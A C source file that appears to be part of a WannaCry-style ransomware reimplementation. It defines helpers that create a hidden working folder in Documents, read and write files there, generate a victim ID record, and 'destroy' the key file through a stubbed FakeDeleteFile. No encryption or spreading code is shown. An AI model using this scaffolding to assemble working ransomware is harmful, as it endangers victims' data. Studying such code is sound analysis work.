#include "WanaFile.h"
#include <time.h>
#include <ShlObj.h>
#include <bcrypt.h>
#include "../Common/ezfile.h"
#pragma comment(lib, "Bcrypt.lib")

BOOL WanaDirName(TCHAR *pDirName)
{
	HRESULT result = SHGetFolderPath(
		NULL,
		CSIDL_PERSONAL,
		NULL,
		SHGFP_TYPE_CURRENT,
		pDirName);
	_tcscat_s(pDirName, MAX_PATH, _T("\\"));
	_tcscat_s(pDirName, MAX_PATH, BASE_DIRNAME);
	return TRUE;
}

BOOL CreateWanaDir(TCHAR* pDirName)
{
	TCHAR szDirName[MAX_PATH + 1];
	WanaDirName(szDirName);
	if (INVALID_FILE_ATTRIBUTES
		== GetFileAttributes(szDirName)) {
		if (!CreateDirectory(szDirName, NULL)) {
			return FALSE;
		}
	}
	if (pDirName) {
		_tcscpy_s(pDirName, MAX_PATH, szDirName);
	}
	return TRUE;
}

BOOL WanaFileName(
	TCHAR *pFileName,
	LPCTSTR pName)
{
	TCHAR szDirName[MAX_PATH];
	WanaDirName(szDirName);
	_stprintf_s(pFileName, MAX_PATH,
		_T("%s\\%s"), szDirName, pName);
	return TRUE;
}

BOOL ReadWanaFile(
	LPCTSTR pFileName,
	PUCHAR pbBuffer,
	DWORD cbBuffer,
	PDWORD pcbResult)
{
	TCHAR szDirName[MAX_PATH + 1];
	TCHAR szFileName[MAX_PATH + 1];
	WanaDirName(szDirName);
	_stprintf_s(szFileName, MAX_PATH,
		_T("%s\\%s"), szDirName, pFileName);
	return ReadBuffer(
		szFileName,
		{ 0 },
		0,
		pbBuffer,
		cbBuffer,
		pcbResult);
}

BOOL WriteWanaFile(
	LPCTSTR pName,
	PUCHAR pbBuffer,
	DWORD cbBuffer,
	PDWORD pcbResult)
{
	TCHAR szDirName[MAX_PATH + 1];
	TCHAR szFileName[MAX_PATH + 1];
	CreateWanaDir(szDirName);
	_stprintf_s(szFileName,
		_T("%s\\%s"), szDirName, pName);
	return WriteBuffer(
		szFileName,
		{ 0 },
		0,
		pbBuffer,
		cbBuffer,
		pcbResult);
}

BOOL ReadResFile(PRESDATA pResData)
{
	DWORD nKeyNo = 0;
	TCHAR szFileName[MAX_PATH + 1];
	WanaFileName(szFileName, RESFILENAME);
	if (INVALID_FILE_ATTRIBUTES
		== GetFileAttributes(szFileName)) {
		ZeroMemory(pResData, sizeof(RESDATA));
		NTSTATUS status = BCryptGenRandom(
			NULL,
			pResData->m_nID,
			sizeof(pResData->m_nID),
			BCRYPT_USE_SYSTEM_PREFERRED_RNG);
		if (!NT_SUCCESS(status))
		{
			return FALSE;
		}
		pResData->m_ExecTime = (DWORD)time(NULL);
		return TRUE;
	}
	return ReadBuffer(
		szFileName,
		{ 0 },
		0,
		(PUCHAR)pResData,
		sizeof(RESDATA),
		NULL);

}

BOOL WanaDestroyKey()
{
	TCHAR szFileName[MAX_PATH + 1];
	WanaFileName(szFileName, EKYFILENAME);
	if (INVALID_FILE_ATTRIBUTES
		== GetFileAttributes(szFileName)) {
		return FALSE;
	}
	// return DeleteFile(szFileName);
	return FakeDeleteFile(szFileName);
}